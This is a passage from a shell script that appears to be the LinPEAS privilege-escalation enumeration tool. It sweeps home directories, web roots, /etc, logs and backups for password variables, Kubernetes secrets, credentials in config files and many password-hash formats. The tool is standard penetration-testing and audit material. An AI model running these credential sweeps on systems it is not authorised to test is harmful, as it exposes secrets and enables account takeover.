    timeout 150 find $HOMESEARCH -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
    timeout 150 find /var/www $backup_folders_row /tmp /etc /mnt /private grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  else
    timeout 150 find $SEARCH_IN_FOLDER -exec grep -HnRiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" '{}' \; 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${SED_RED},g" | sed -${E} "s,$pwd_in_variables2,${SED_RED},g" | sed -${E} "s,$pwd_in_variables3,${SED_RED},g" | sed -${E} "s,$pwd_in_variables4,${SED_RED},g" | sed -${E} "s,$pwd_in_variables5,${SED_RED},g" | sed -${E} "s,$pwd_in_variables6,${SED_RED},g" | sed -${E} "s,$pwd_in_variables7,${SED_RED},g" | sed -${E} "s,$pwd_in_variables8,${SED_RED},g" | sed -${E} "s,$pwd_in_variables9,${SED_RED},g" | sed -${E} "s,$pwd_in_variables10,${SED_RED},g" | sed -${E} "s,$pwd_in_variables11,${SED_RED},g" &
  fi
  wait
  echo ""

  print_2title "Searching possible password in config files (if k8s secrets are found you need to read the file)"
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    ppicf=$(timeout 150 find $HOMESEARCH /var/www/ /usr/local/www/ /etc /opt /tmp /private /Applications /mnt -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  else
    ppicf=$(timeout 150 find $SEARCH_IN_FOLDER -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" -name "*.yml" -name "*.yaml" 2>/dev/null)
  fi
  printf "%s\n" "$ppicf" | while read f; do
    if grep -qEiI 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' \"$f\" 2>/dev/null; then
      echo "$ITALIC $f$NC"
      grep -HnEiIo 'passwd.*|creden.*|^kind:\W?Secret|\Wenv:|\Wsecret:|\WsecretName:|^kind:\W?EncryptionConfiguration|\-\-encriyption\-provider\-config' "$f" 2>/dev/null | sed -${E} "s,[pP][aA][sS][sS][wW]|[cC][rR][eE][dD][eE][nN],${SED_RED},g"
    fi
  done
  echo ""
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q api_keys_regex; then
print_title "API Keys Regex"

if [ "$REGEXES" ] && [ "$TIMEOUT" ]; then
    print_2title "Searching Hashed Passwords"
print_3title_no_nl "Searching Apr1 MD5 (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Apache SHA (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\{SHA\}[0-9a-zA-Z/_=]{10,}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Blowfish (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Drupal (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$S\$[a-zA-Z0-9_/\.]{52}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Joomlavbulletin (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Linux MD5 (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching phpbb3 (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$H\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching sha512crypt (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
